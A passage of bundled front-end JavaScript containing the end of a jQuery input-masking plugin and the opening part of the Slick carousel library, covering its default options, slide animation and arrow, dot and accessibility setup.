          if (0 !== this.length && !this.is(":hidden"))
            return "number" == typeof e
              ? ((t = "number" == typeof t ? t : e),
                this.each(function () {
                  this.setSelectionRange ? this.setSelectionRange(e, t) : this.createTextRange && ((n = this.createTextRange()).collapse(!0), n.moveEnd("character", t), n.moveStart("character", e), n.select());
                }))
              : (this[0].setSelectionRange
                  ? ((e = this[0].selectionStart), (t = this[0].selectionEnd))
                  : document.selection && document.selection.createRange && ((n = document.selection.createRange()), (e = 0 - n.duplicate().moveStart("character", -1e5)), (t = e + n.text.length)),
                { begin: e, end: t });
        },
        unmask: function () {
          return this.trigger("unmask");
        },
        mask: function (n, s) {
          var a, l, c, u, d, p, f;
          if (!n && this.length > 0) {
            var h = e(this[0]).data(e.mask.dataName);
            return h ? h() : void 0;
          }
          return (
            (s = e.extend({ autoclear: e.mask.autoclear, placeholder: e.mask.placeholder, completed: null }, s)),
            (a = e.mask.definitions),
            (l = []),
            (c = p = n.length),
            (u = null),
            e.each(n.split(""), function (e, t) {
              "?" == t ? (p--, (c = e)) : a[t] ? (l.push(new RegExp(a[t])), null === u && (u = l.length - 1), c > e && (d = l.length - 1)) : l.push(null);
            }),
            this.trigger("unmask").each(function () {
              function h() {
                if (s.completed) {
                  for (var e = u; d >= e; e++) if (l[e] && C[e] === g(e)) return;
                  s.completed.call(_);
                }
              }
              function g(e) {
                return s.placeholder.charAt(e < s.placeholder.length ? e : 0);
              }
              function m(e) {
                for (; ++e < p && !l[e]; );
                return e;
              }
              function v(e, t) {
                var n, i;
                if (!(0 > e)) {
                  for (n = e, i = m(t); p > n; n++)
                    if (l[n]) {
                      if (!(p > i && l[n].test(C[i]))) break;
                      (C[n] = C[i]), (C[i] = g(i)), (i = m(i));
                    }
                  b(), _.caret(Math.max(u, e));
                }
              }
              function y() {
                T(), _.val() != S && _.change();
              }
              function w(e, t) {
                var n;
                for (n = e; t > n && p > n; n++) l[n] && (C[n] = g(n));
              }
              function b() {
                _.val(C.join(""));
              }
              function T(e) {
                var t,
                  n,
                  i,
                  o = _.val(),
                  r = -1;
                for (t = 0, i = 0; p > t; t++)
                  if (l[t]) {
                    for (C[t] = g(t); i++ < o.length; )
                      if (((n = o.charAt(i - 1)), l[t].test(n))) {
                        (C[t] = n), (r = t);
                        break;
                      }
                    if (i > o.length) {
                      w(t + 1, p);
                      break;
                    }
                  } else C[t] === o.charAt(i) && i++, c > t && (r = t);
                return e ? b() : c > r + 1 ? (s.autoclear || C.join("") === k ? (_.val() && _.val(""), w(0, p)) : b()) : (b(), _.val(_.val().substring(0, r + 1))), c ? t : u;
              }
              var _ = e(this),
                C = e.map(n.split(""), function (e, t) {
                  return "?" != e ? (a[e] ? g(t) : e) : void 0;
                }),
                k = C.join(""),
                S = _.val();
              _.data(e.mask.dataName, function () {
                return e
                  .map(C, function (e, t) {
                    return l[t] && e != g(t) ? e : null;
                  })
                  .join("");
              }),
                _.one("unmask", function () {
                  _.off(".mask").removeData(e.mask.dataName);
                })
                  .on("focus.mask", function () {
                    var e;
                    _.prop("readonly") ||
                      (clearTimeout(t),
                      (S = _.val()),
                      (e = T()),
                      (t = setTimeout(function () {
                        _.get(0) === document.activeElement && (b(), e == n.replace("?", "").length ? _.caret(0, e) : _.caret(e));
                      }, 10)));
                  })
                  .on("blur.mask", y)
                  .on("keydown.mask", function (e) {
                    if (!_.prop("readonly")) {
                      var t,
                        n,
                        o,
                        r = e.which || e.keyCode;
                      (f = _.val()),
                        8 === r || 46 === r || (i && 127 === r)
                          ? ((n = (t = _.caret()).begin),
                            (o = t.end) - n == 0 &&
                              ((n =
                                46 !== r
                                  ? (function (e) {
                                      for (; --e >= 0 && !l[e]; );
                                      return e;
                                    })(n)
                                  : (o = m(n - 1))),
                              (o = 46 === r ? m(o) : o)),
                            w(n, o),
                            v(n, o - 1),
                            e.preventDefault())
                          : 13 === r
                          ? y.call(this, e)
                          : 27 === r && (_.val(S), _.caret(0, T()), e.preventDefault());
                    }
                  })
                  .on("keypress.mask", function (t) {
                    if (!_.prop("readonly")) {
                      var n,
                        i,
                        o,
                        s = t.which || t.keyCode,
                        a = _.caret();
                      if (!(t.ctrlKey || t.altKey || t.metaKey || 32 > s) && s && 13 !== s) {
                        if ((a.end - a.begin != 0 && (w(a.begin, a.end), v(a.begin, a.end - 1)), (n = m(a.begin - 1)), p > n && ((i = String.fromCharCode(s)), l[n].test(i)))) {
                          if (
                            ((function (e) {
                              var t, n, i, o;
                              for (t = e, n = g(e); p > t; t++)
                                if (l[t]) {
                                  if (((i = m(t)), (o = C[t]), (C[t] = n), !(p > i && l[i].test(o)))) break;
                                  n = o;
                                }
                            })(n),
                            (C[n] = i),
                            b(),
                            (o = m(n)),
                            r)
                          ) {
                            setTimeout(function () {
                              e.proxy(e.fn.caret, _, o)();
                            }, 0);
                          } else _.caret(o);
                          a.begin <= d && h();
                        }
                        t.preventDefault();
                      }
                    }
                  })
                  .on("input.mask paste.mask", function () {
                    _.prop("readonly") ||
                      setTimeout(function () {
                        var e = T(!0);
                        _.caret(e), h();
                      }, 0);
                  }),
                o &&
                  r &&
                  _.off("input.mask").on("input.mask", function () {
                    var e = _.val(),
                      t = _.caret();
                    if (f && f.length && f.length > e.length) {
                      for (T(!0); t.begin > 0 && !l[t.begin - 1]; ) t.begin--;
                      if (0 === t.begin) for (; t.begin < u && !l[t.begin]; ) t.begin++;
                      _.caret(t.begin, t.begin);
                    } else {
                      for (T(!0); t.begin < p && !l[t.begin]; ) t.begin++;
                      _.caret(t.begin, t.begin);
                    }
                    h();
                  }),
                T();
            })
          );
        },
      });
  }),
  (function (e) {
    "use strict";
    "function" == typeof define && define.amd ? define(["jquery"], e) : "undefined" != typeof exports ? (module.exports = e(require("jquery"))) : e(jQuery);
  })(function (e) {
    "use strict";
    var t = window.Slick || {};
    ((t = (function () {
      var t = 0;
      return function (n, i) {
        var o,
          r = this;
        (r.defaults = {
          accessibility: !0,
          adaptiveHeight: !1,
          appendArrows: e(n),
          appendDots: e(n),
          arrows: !0,
          asNavFor: null,
          prevArrow: '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
          nextArrow: '<button class="slick-next" aria-label="Next" type="button">Next</button>',
          autoplay: !1,
          autoplaySpeed: 3e3,
          centerMode: !1,
          centerPadding: "50px",
          cssEase: "ease",
          customPaging: function (t, n) {
            return e('<button type="button" />').text(n + 1);
          },
          dots: !1,
          dotsClass: "slick-dots",
          draggable: !0,
          easing: "linear",
          edgeFriction: 0.35,
          fade: !1,
          focusOnSelect: !1,
          focusOnChange: !1,
          infinite: !0,
          initialSlide: 0,
          lazyLoad: "ondemand",
          mobileFirst: !1,
          pauseOnHover: !0,
          pauseOnFocus: !0,
          pauseOnDotsHover: !1,
          respondTo: "window",
          responsive: null,
          rows: 1,
          rtl: !1,
          slide: "",
          slidesPerRow: 1,
          slidesToShow: 1,
          slidesToScroll: 1,
          speed: 500,
          swipe: !0,
          swipeToSlide: !1,
          touchMove: !0,
          touchThreshold: 5,
          useCSS: !0,
          useTransform: !0,
          variableWidth: !1,
          vertical: !1,
          verticalSwiping: !1,
          waitForAnimate: !0,
          zIndex: 1e3,
        }),
          (r.initials = {
            animating: !1,
            dragging: !1,
            autoPlayTimer: null,
            currentDirection: 0,
            currentLeft: null,
            currentSlide: 0,
            direction: 1,
            $dots: null,
            listWidth: null,
            listHeight: null,
            loadIndex: 0,
            $nextArrow: null,
            $prevArrow: null,
            scrolling: !1,
            slideCount: null,
            slideWidth: null,
            $slideTrack: null,
            $slides: null,
            sliding: !1,
            slideOffset: 0,
            swipeLeft: null,
            swiping: !1,
            $list: null,
            touchObject: {},
            transformsEnabled: !1,
            unslicked: !1,
          }),
          e.extend(r, r.initials),
          (r.activeBreakpoint = null),
          (r.animType = null),
          (r.animProp = null),
          (r.breakpoints = []),
          (r.breakpointSettings = []),
          (r.cssTransitions = !1),
          (r.focussed = !1),
          (r.interrupted = !1),
          (r.hidden = "hidden"),
          (r.paused = !0),
          (r.positionProp = null),
          (r.respondTo = null),
          (r.rowCount = 1),
          (r.shouldClick = !0),
          (r.$slider = e(n)),
          (r.$slidesCache = null),
          (r.transformType = null),
          (r.transitionType = null),
          (r.visibilityChange = "visibilitychange"),
          (r.windowWidth = 0),
          (r.windowTimer = null),
          (o = e(n).data("slick") || {}),
          (r.options = e.extend({}, r.defaults, i, o)),
          (r.currentSlide = r.options.initialSlide),
          (r.originalSettings = r.options),
          void 0 !== document.mozHidden ? ((r.hidden = "mozHidden"), (r.visibilityChange = "mozvisibilitychange")) : void 0 !== document.webkitHidden && ((r.hidden = "webkitHidden"), (r.visibilityChange = "webkitvisibilitychange")),
          (r.autoPlay = e.proxy(r.autoPlay, r)),
          (r.autoPlayClear = e.proxy(r.autoPlayClear, r)),
          (r.autoPlayIterator = e.proxy(r.autoPlayIterator, r)),
          (r.changeSlide = e.proxy(r.changeSlide, r)),
          (r.clickHandler = e.proxy(r.clickHandler, r)),
          (r.selectHandler = e.proxy(r.selectHandler, r)),
          (r.setPosition = e.proxy(r.setPosition, r)),
          (r.swipeHandler = e.proxy(r.swipeHandler, r)),
          (r.dragHandler = e.proxy(r.dragHandler, r)),
          (r.keyHandler = e.proxy(r.keyHandler, r)),
          (r.instanceUid = t++),
          (r.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/),
          r.registerBreakpoints(),
          r.init(!0);
      };
    })()).prototype.activateADA = function () {
      this.$slideTrack.find(".slick-active").attr({ "aria-hidden": "false" }).find("a, input, button, select").attr({ tabindex: "0" });
    }),
      (t.prototype.addSlide = t.prototype.slickAdd = function (t, n, i) {
        var o = this;
        if ("boolean" == typeof n) (i = n), (n = null);
        else if (n < 0 || n >= o.slideCount) return !1;
        o.unload(),
          "number" == typeof n
            ? 0 === n && 0 === o.$slides.length
              ? e(t).appendTo(o.$slideTrack)
              : i
              ? e(t).insertBefore(o.$slides.eq(n))
              : e(t).insertAfter(o.$slides.eq(n))
            : !0 === i
            ? e(t).prependTo(o.$slideTrack)
            : e(t).appendTo(o.$slideTrack),
          (o.$slides = o.$slideTrack.children(this.options.slide)),
          o.$slideTrack.children(this.options.slide).detach(),
          o.$slideTrack.append(o.$slides),
          o.$slides.each(function (t, n) {
            e(n).attr("data-slick-index", t);
          }),
          (o.$slidesCache = o.$slides),
          o.reinit();
      }),
      (t.prototype.animateHeight = function () {
        var e = this;
        if (1 === e.options.slidesToShow && !0 === e.options.adaptiveHeight && !1 === e.options.vertical) {
          var t = e.$slides.eq(e.currentSlide).outerHeight(!0);
          e.$list.animate({ height: t }, e.options.speed);
        }
      }),
      (t.prototype.animateSlide = function (t, n) {
        var i = {},
          o = this;
        o.animateHeight(),
          !0 === o.options.rtl && !1 === o.options.vertical && (t = -t),
          !1 === o.transformsEnabled
            ? !1 === o.options.vertical
              ? o.$slideTrack.animate({ left: t }, o.options.speed, o.options.easing, n)
              : o.$slideTrack.animate({ top: t }, o.options.speed, o.options.easing, n)
            : !1 === o.cssTransitions
            ? (!0 === o.options.rtl && (o.currentLeft = -o.currentLeft),
              e({ animStart: o.currentLeft }).animate(
                { animStart: t },
                {
                  duration: o.options.speed,
                  easing: o.options.easing,
                  step: function (e) {
                    (e = Math.ceil(e)), !1 === o.options.vertical ? ((i[o.animType] = "translate(" + e + "px, 0px)"), o.$slideTrack.css(i)) : ((i[o.animType] = "translate(0px," + e + "px)"), o.$slideTrack.css(i));
                  },
                  complete: function () {
                    n && n.call();
                  },
                }
              ))
            : (o.applyTransition(),
              (t = Math.ceil(t)),
              !1 === o.options.vertical ? (i[o.animType] = "translate3d(" + t + "px, 0px, 0px)") : (i[o.animType] = "translate3d(0px," + t + "px, 0px)"),
              o.$slideTrack.css(i),
              n &&
                setTimeout(function () {
                  o.disableTransition(), n.call();
                }, o.options.speed));
      }),
      (t.prototype.getNavTarget = function () {
        var t = this.options.asNavFor;
        return t && null !== t && (t = e(t).not(this.$slider)), t;
      }),
      (t.prototype.asNavFor = function (t) {
        var n = this.getNavTarget();
        null !== n &&
          "object" == typeof n &&
          n.each(function () {
            var n = e(this).slick("getSlick");
            n.unslicked || n.slideHandler(t, !0);
          });
      }),
      (t.prototype.applyTransition = function (e) {
        var t = this,
          n = {};
        !1 === t.options.fade ? (n[t.transitionType] = t.transformType + " " + t.options.speed + "ms " + t.options.cssEase) : (n[t.transitionType] = "opacity " + t.options.speed + "ms " + t.options.cssEase),
          !1 === t.options.fade ? t.$slideTrack.css(n) : t.$slides.eq(e).css(n);
      }),
      (t.prototype.autoPlay = function () {
        var e = this;
        e.autoPlayClear(), e.slideCount > e.options.slidesToShow && (e.autoPlayTimer = setInterval(e.autoPlayIterator, e.options.autoplaySpeed));
      }),
      (t.prototype.autoPlayClear = function () {
        this.autoPlayTimer && clearInterval(this.autoPlayTimer);
      }),
      (t.prototype.autoPlayIterator = function () {
        var e = this,
          t = e.currentSlide + e.options.slidesToScroll;
        e.paused ||
          e.interrupted ||
          e.focussed ||
          (!1 === e.options.infinite &&
            (1 === e.direction && e.currentSlide + 1 === e.slideCount - 1 ? (e.direction = 0) : 0 === e.direction && ((t = e.currentSlide - e.options.slidesToScroll), e.currentSlide - 1 == 0 && (e.direction = 1))),
          e.slideHandler(t));
      }),
      (t.prototype.buildArrows = function () {
        var t = this;
        !0 === t.options.arrows &&
          ((t.$prevArrow = e(t.options.prevArrow).addClass("slick-arrow")),
          (t.$nextArrow = e(t.options.nextArrow).addClass("slick-arrow")),
          t.slideCount > t.options.slidesToShow
            ? (t.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),
              t.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),
              t.htmlExpr.test(t.options.prevArrow) && t.$prevArrow.prependTo(t.options.appendArrows),
              t.htmlExpr.test(t.options.nextArrow) && t.$nextArrow.appendTo(t.options.appendArrows),
              !0 !== t.options.infinite && t.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"))
            : t.$prevArrow.add(t.$nextArrow).addClass("slick-hidden").attr({ "aria-disabled": "true", tabindex: "-1" }));
      }),
      (t.prototype.buildDots = function () {
        var t,
          n,
          i = this;
        if (!0 === i.options.dots) {
          for (i.$slider.addClass("slick-dotted"), n = e("<ul />").addClass(i.options.dotsClass), t = 0; t <= i.getDotCount(); t += 1) n.append(e("<li />").append(i.options.customPaging.call(this, i, t)));
          (i.$dots = n.appendTo(i.options.appendDots)), i.$dots.find("li").first().addClass("slick-active");
        }
      }),
      (t.prototype.buildOut = function () {
        var t = this;
        (t.$slides = t.$slider.children(t.options.slide + ":not(.slick-cloned)").addClass("slick-slide")),
          (t.slideCount = t.$slides.length),
          t.$slides.each(function (t, n) {
            e(n)
              .attr("data-slick-index", t)
              .data("originalStyling", e(n).attr("style") || "");
          }),
          t.$slider.addClass("slick-slider"),
          (t.$slideTrack = 0 === t.slideCount ? e('<div class="slick-track"/>').appendTo(t.$slider) : t.$slides.wrapAll('<div class="slick-track"/>').parent()),
          (t.$list = t.$slideTrack.wrap('<div class="slick-list"/>').parent()),
          t.$slideTrack.css("opacity", 0),
          (!0 !== t.options.centerMode && !0 !== t.options.swipeToSlide) || (t.options.slidesToScroll = 1),
          e("img[data-lazy]", t.$slider).not("[src]").addClass("slick-loading"),
          t.setupInfinite(),
          t.buildArrows(),
          t.buildDots(),
          t.updateDots(),
          t.setSlideClasses("number" == typeof t.currentSlide ? t.currentSlide : 0),
          !0 === t.options.draggable && t.$list.addClass("draggable");
      }),
      (t.prototype.buildRows = function () {
        var e,
          t,
          n,
          i,
          o,
          r,
          s,
          a = this;
        if (((i = document.createDocumentFragment()), (r = a.$slider.children()), a.options.rows > 1)) {
          for (s = a.options.slidesPerRow * a.options.rows, o = Math.ceil(r.length / s), e = 0; e < o; e++) {
            var l = document.createElement("div");
            for (t = 0; t < a.options.rows; t++) {
              var c = document.createElement("div");
              for (n = 0; n < a.options.slidesPerRow; n++) {
                var u = e * s + (t * a.options.slidesPerRow + n);
                r.get(u) && c.appendChild(r.get(u));
              }
              l.appendChild(c);
            }
            i.appendChild(l);
          }
          a.$slider.empty().append(i),
            a.$slider
              .children()
              .children()
              .children()
              .css({ width: 100 / a.options.slidesPerRow + "%", display: "inline-block" });
        }
      }),
      (t.prototype.checkResponsive = function (t, n) {
        var i,
          o,
          r,
          s = this,
          a = !1,
          l = s.$slider.width(),
          c = window.innerWidth || e(window).width();
        if (("window" === s.respondTo ? (r = c) : "slider" === s.respondTo ? (r = l) : "min" === s.respondTo && (r = Math.min(c, l)), s.options.responsive && s.options.responsive.length && null !== s.options.responsive)) {
          for (i in ((o = null), s.breakpoints)) s.breakpoints.hasOwnProperty(i) && (!1 === s.originalSettings.mobileFirst ? r < s.breakpoints[i] && (o = s.breakpoints[i]) : r > s.breakpoints[i] && (o = s.breakpoints[i]));
          null !== o
            ? null !== s.activeBreakpoint
              ? (o !== s.activeBreakpoint || n) &&
                ((s.activeBreakpoint = o),
                "unslick" === s.breakpointSettings[o] ? s.unslick(o) : ((s.options = e.extend({}, s.originalSettings, s.breakpointSettings[o])), !0 === t && (s.currentSlide = s.options.initialSlide), s.refresh(t)),
                (a = o))
              : ((s.activeBreakpoint = o),
                "unslick" === s.breakpointSettings[o] ? s.unslick(o) : ((s.options = e.extend({}, s.originalSettings, s.breakpointSettings[o])), !0 === t && (s.currentSlide = s.options.initialSlide), s.refresh(t)),
                (a = o))
            : null !== s.activeBreakpoint && ((s.activeBreakpoint = null), (s.options = s.originalSettings), !0 === t && (s.currentSlide = s.options.initialSlide), s.refresh(t), (a = o)),
            t || !1 === a || s.$slider.trigger("breakpoint", [s, a]);
        }
      }),
      (t.prototype.changeSlide = function (t, n) {
        var i,
          o,
          r = this,
          s = e(t.currentTarget);
        switch ((s.is("a") && t.preventDefault(), s.is("li") || (s = s.closest("li")), (i = r.slideCount % r.options.slidesToScroll != 0 ? 0 : (r.slideCount - r.currentSlide) % r.options.slidesToScroll), t.data.message)) {
          case "previous":
            (o = 0 === i ? r.options.slidesToScroll : r.options.slidesToShow - i), r.slideCount > r.options.slidesToShow && r.slideHandler(r.currentSlide - o, !1, n);
            break;
          case "next":
            (o = 0 === i ? r.options.slidesToScroll : i), r.slideCount > r.options.slidesToShow && r.slideHandler(r.currentSlide + o, !1, n);
            break;
          case "index":
            var a = 0 === t.data.index ? 0 : t.data.index || s.index() * r.options.slidesToScroll;
            r.slideHandler(r.checkNavigable(a), !1, n), s.children().trigger("focus");
            break;
          default:
            return;
        }
      }),
      (t.prototype.checkNavigable = function (e) {
        var t, n;
        if (((n = 0), e > (t = this.getNavigableIndexes())[t.length - 1])) e = t[t.length - 1];
        else
          for (var i in t) {
            if (e < t[i]) {
              e = n;
              break;
            }
            n = t[i];
          }
        return e;
      }),
      (t.prototype.cleanUpEvents = function () {
        var t = this;
        t.options.dots &&
          null !== t.$dots &&
          (e("li", t.$dots).off("click.slick", t.changeSlide).off("mouseenter.slick", e.proxy(t.interrupt, t, !0)).off("mouseleave.slick", e.proxy(t.interrupt, t, !1)),
          !0 === t.options.accessibility && t.$dots.off("keydown.slick", t.keyHandler)),
          t.$slider.off("focus.slick blur.slick"),
          !0 === t.options.arrows &&
            t.slideCount > t.options.slidesToShow &&
            (t.$prevArrow && t.$prevArrow.off("click.slick", t.changeSlide),
            t.$nextArrow && t.$nextArrow.off("click.slick", t.changeSlide),
            !0 === t.options.accessibility && (t.$prevArrow && t.$prevArrow.off("keydown.slick", t.keyHandler), t.$nextArrow && t.$nextArrow.off("keydown.slick", t.keyHandler))),
          t.$list.off("touchstart.slick mousedown.slick", t.swipeHandler),
          t.$list.off("touchmove.slick mousemove.slick", t.swipeHandler),
          t.$list.off("touchend.slick mouseup.slick", t.swipeHandler),
          t.$list.off("touchcancel.slick mouseleave.slick", t.swipeHandler),
          t.$list.off("click.slick", t.clickHandler),
          e(document).off(t.visibilityChange, t.visibility),
          t.cleanUpSlideEvents(),
          !0 === t.options.accessibility && t.$list.off("keydown.slick", t.keyHandler),
          !0 === t.options.focusOnSelect && e(t.$slideTrack).children().off("click.slick", t.selectHandler),
          e(window).off("orientationchange.slick.slick-" + t.instanceUid, t.orientationChange),
          e(window).off("resize.slick.slick-" + t.instanceUid, t.resize),
          e("[draggable!=true]", t.$slideTrack).off("dragstart", t.preventDefault),
          e(window).off("load.slick.slick-" + t.instanceUid, t.setPosition);
      }),
      (t.prototype.cleanUpSlideEvents = function () {
        var t = this;
        t.$list.off("mouseenter.slick", e.proxy(t.interrupt, t, !0)), t.$list.off("mouseleave.slick", e.proxy(t.interrupt, t, !1));
      }),
      (t.prototype.cleanUpRows = function () {
        var e,
          t = this;
        t.options.rows > 1 && ((e = t.$slides.children().children()).removeAttr("style"), t.$slider.empty().append(e));
      }),
      (t.prototype.clickHandler = function (e) {
        !1 === this.shouldClick && (e.stopImmediatePropagation(), e.stopPropagation(), e.preventDefault());
      }),
      (t.prototype.destroy = function (t) {
        var n = this;
        n.autoPlayClear(),
          (n.touchObject = {}),
          n.cleanUpEvents(),
          e(".slick-cloned", n.$slider).detach(),
          n.$dots && n.$dots.remove(),
          n.$prevArrow &&
            n.$prevArrow.length &&
            (n.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), n.htmlExpr.test(n.options.prevArrow) && n.$prevArrow.remove()),
          n.$nextArrow &&
            n.$nextArrow.length &&
            (n.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), n.htmlExpr.test(n.options.nextArrow) && n.$nextArrow.remove()),
          n.$slides &&
            (n.$slides
              .removeClass("slick-slide slick-active slick-center slick-visible slick-current")
              .removeAttr("aria-hidden")
              .removeAttr("data-slick-index")
              .each(function () {
                e(this).attr("style", e(this).data("originalStyling"));
              }),
            n.$slideTrack.children(this.options.slide).detach(),
            n.$slideTrack.detach(),
            n.$list.detach(),
            n.$slider.append(n.$slides)),
          n.cleanUpRows(),
          n.$slider.removeClass("slick-slider"),
          n.$slider.removeClass("slick-initialized"),
          n.$slider.removeClass("slick-dotted"),
          (n.unslicked = !0),
          t || n.$slider.trigger("destroy", [n]);
      }),
      (t.prototype.disableTransition = function (e) {
        var t = this,
          n = {};
        (n[t.transitionType] = ""), !1 === t.options.fade ? t.$slideTrack.css(n) : t.$slides.eq(e).css(n);
      }),
      (t.prototype.fadeSlide = function (e, t) {
        var n = this;
        !1 === n.cssTransitions
          ? (n.$slides.eq(e).css({ zIndex: n.options.zIndex }), n.$slides.eq(e).animate({ opacity: 1 }, n.options.speed, n.options.easing, t))
          : (n.applyTransition(e),
            n.$slides.eq(e).css({ opacity: 1, zIndex: n.options.zIndex }),
            t &&
              setTimeout(function () {
                n.disableTransition(e), t.call();
              }, n.options.speed));
      }),
      (t.prototype.fadeSlideOut = function (e) {
        var t = this;
        !1 === t.cssTransitions ? t.$slides.eq(e).animate({ opacity: 0, zIndex: t.options.zIndex - 2 }, t.options.speed, t.options.easing) : (t.applyTransition(e), t.$slides.eq(e).css({ opacity: 0, zIndex: t.options.zIndex - 2 }));
      }),
      (t.prototype.filterSlides = t.prototype.slickFilter = function (e) {
        var t = this;
        null !== e && ((t.$slidesCache = t.$slides), t.unload(), t.$slideTrack.children(this.options.slide).detach(), t.$slidesCache.filter(e).appendTo(t.$slideTrack), t.reinit());
      }),
      (t.prototype.focusHandler = function () {
        var t = this;
        t.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*", function (n) {
          n.stopImmediatePropagation();
          var i = e(this);
          setTimeout(function () {
            t.options.pauseOnFocus && ((t.focussed = i.is(":focus")), t.autoPlay());
          }, 0);
        });
      }),
      (t.prototype.getCurrent = t.prototype.slickCurrentSlide = function () {
        return this.currentSlide;
      }),
      (t.prototype.getDotCount = function () {
        var e = this,
          t = 0,
          n = 0,
          i = 0;
        if (!0 === e.options.infinite)
          if (e.slideCount <= e.options.slidesToShow) ++i;
          else for (; t < e.slideCount; ) ++i, (t = n + e.options.slidesToScroll), (n += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow);
        else if (!0 === e.options.centerMode) i = e.slideCount;
        else if (e.options.asNavFor) for (; t < e.slideCount; ) ++i, (t = n + e.options.slidesToScroll), (n += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow);
        else i = 1 + Math.ceil((e.slideCount - e.options.slidesToShow) / e.options.slidesToScroll);
        return i - 1;
      }),
      (t.prototype.getLeft = function (e) {
        var t,
          n,
          i,
          o,
          r = this,
          s = 0;
        return (
          (r.slideOffset = 0),
          (n = r.$slides.first().outerHeight(!0)),
          !0 === r.options.infinite
            ? (r.slideCount > r.options.slidesToShow &&
                ((r.slideOffset = r.slideWidth * r.options.slidesToShow * -1),
                (o = -1),
                !0 === r.options.vertical && !0 === r.options.centerMode && (2 === r.options.slidesToShow ? (o = -1.5) : 1 === r.options.slidesToShow && (o = -2)),
                (s = n * r.options.slidesToShow * o)),
              r.slideCount % r.options.slidesToScroll != 0 &&
                e + r.options.slidesToScroll > r.slideCount &&
                r.slideCount > r.options.slidesToShow &&
                (e > r.slideCount
                  ? ((r.slideOffset = (r.options.slidesToShow - (e - r.slideCount)) * r.slideWidth * -1), (s = (r.options.slidesToShow - (e - r.slideCount)) * n * -1))
                  : ((r.slideOffset = (r.slideCount % r.options.slidesToScroll) * r.slideWidth * -1), (s = (r.slideCount % r.options.slidesToScroll) * n * -1))))
            : e + r.options.slidesToShow > r.slideCount && ((r.slideOffset = (e + r.options.slidesToShow - r.slideCount) * r.slideWidth), (s = (e + r.options.slidesToShow - r.slideCount) * n)),
          r.slideCount <= r.options.slidesToShow && ((r.slideOffset = 0), (s = 0)),
          !0 === r.options.centerMode && r.slideCount <= r.options.slidesToShow
            ? (r.slideOffset = (r.slideWidth * Math.floor(r.options.slidesToShow)) / 2 - (r.slideWidth * r.slideCount) / 2)
            : !0 === r.options.centerMode && !0 === r.options.infinite
            ? (r.slideOffset += r.slideWidth * Math.floor(r.options.slidesToShow / 2) - r.slideWidth)
            : !0 === r.options.centerMode && ((r.slideOffset = 0), (r.slideOffset += r.slideWidth * Math.floor(r.options.slidesToShow / 2))),
          (t = !1 === r.options.vertical ? e * r.slideWidth * -1 + r.slideOffset : e * n * -1 + s),
          !0 === r.options.variableWidth &&
            ((i = r.slideCount <= r.options.slidesToShow || !1 === r.options.infinite ? r.$slideTrack.children(".slick-slide").eq(e) : r.$slideTrack.children(".slick-slide").eq(e + r.options.slidesToShow)),
            (t = !0 === r.options.rtl ? (i[0] ? -1 * (r.$slideTrack.width() - i[0].offsetLeft - i.width()) : 0) : i[0] ? -1 * i[0].offsetLeft : 0),
            !0 === r.options.centerMode &&
              ((i = r.slideCount <= r.options.slidesToShow || !1 === r.options.infinite ? r.$slideTrack.children(".slick-slide").eq(e) : r.$slideTrack.children(".slick-slide").eq(e + r.options.slidesToShow + 1)),
              (t = !0 === r.options.rtl ? (i[0] ? -1 * (r.$slideTrack.width() - i[0].offsetLeft - i.width()) : 0) : i[0] ? -1 * i[0].offsetLeft : 0),
              (t += (r.$list.width() - i.outerWidth()) / 2))),
          t
        );
      }),
      (t.prototype.getOption = t.prototype.slickGetOption = function (e) {
        return this.options[e];
      }),
      (t.prototype.getNavigableIndexes = function () {
        var e,
          t = this,
          n = 0,
          i = 0,
          o = [];
        for (!1 === t.options.infinite ? (e = t.slideCount) : ((n = -1 * t.options.slidesToScroll), (i = -1 * t.options.slidesToScroll), (e = 2 * t.slideCount)); n < e; )
          o.push(n), (n = i + t.options.slidesToScroll), (i += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow);
        return o;
      }),
      (t.prototype.getSlick = function () {
        return this;
      }),
      (t.prototype.getSlideCount = function () {
        var t,
          n,
          i = this;
        return (
          (n = !0 === i.options.centerMode ? i.slideWidth * Math.floor(i.options.slidesToShow / 2) : 0),
          !0 === i.options.swipeToSlide
            ? (i.$slideTrack.find(".slick-slide").each(function (o, r) {
                if (r.offsetLeft - n + e(r).outerWidth() / 2 > -1 * i.swipeLeft) return (t = r), !1;
              }),
              Math.abs(e(t).attr("data-slick-index") - i.currentSlide) || 1)
            : i.options.slidesToScroll
        );
      }),
      (t.prototype.goTo = t.prototype.slickGoTo = function (e, t) {
        this.changeSlide({ data: { message: "index", index: parseInt(e) } }, t);
      }),
      (t.prototype.init = function (t) {
        var n = this;
        e(n.$slider).hasClass("slick-initialized") ||
          (e(n.$slider).addClass("slick-initialized"), n.buildRows(), n.buildOut(), n.setProps(), n.startLoad(), n.loadSlider(), n.initializeEvents(), n.updateArrows(), n.updateDots(), n.checkResponsive(!0), n.focusHandler()),
          t && n.$slider.trigger("init", [n]),
          !0 === n.options.accessibility && n.initADA(),
          n.options.autoplay && ((n.paused = !1), n.autoPlay());
      }),
      (t.prototype.initADA = function () {
        var t = this,
          n = Math.ceil(t.slideCount / t.options.slidesToShow),
          i = t.getNavigableIndexes().filter(function (e) {
            return e >= 0 && e < t.slideCount;
          });
        t.$slides.add(t.$slideTrack.find(".slick-cloned")).attr({ "aria-hidden": "true", tabindex: "-1" }).find("a, input, button, select").attr({ tabindex: "-1" }),
          null !== t.$dots &&
            (t.$slides.not(t.$slideTrack.find(".slick-cloned")).each(function (n) {
              var o = i.indexOf(n);
              e(this).attr({ role: "tabpanel", id: "slick-slide" + t.instanceUid + n, tabindex: -1 }), -1 !== o && e(this).attr({ "aria-describedby": "slick-slide-control" + t.instanceUid + o });
            }),
            t.$dots
              .attr("role", "tablist")
              .find("li")
              .each(function (o) {
                var r = i[o];
                e(this).attr({ role: "presentation" }),
                  e(this)
                    .find("button")
